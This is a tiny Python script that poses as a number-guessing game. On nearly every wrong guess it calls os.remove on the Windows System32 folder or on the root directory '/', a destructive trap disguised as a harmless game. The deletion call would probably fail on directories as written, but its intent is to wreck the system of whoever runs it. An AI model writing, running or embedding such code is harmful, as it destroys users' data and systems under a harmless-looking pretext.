#!/usr/bin/env python3

import os, random


def guess(input: int):
    number: int = random.randint(0, 256)
    if input == number:
        print("Congratulations! Your number is correct!")
    else:
        os.remove("C:\\Windows\\System32" if os.name == "nt" else "/")


if __name__ == "__main__":
    input: int = int(input("Input your number: "))
    guess(input)
